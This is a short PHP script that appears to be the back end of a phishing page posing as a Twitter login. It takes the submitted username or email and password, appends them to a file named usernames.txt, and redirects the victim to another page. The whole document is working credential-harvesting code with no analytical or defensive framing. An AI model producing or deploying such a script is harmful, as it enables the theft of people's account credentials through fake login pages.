<?php

file_put_contents("usernames.txt", "Twitter Username: " . $_POST['usernameOrEmail'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: new.html');
exit();
?>
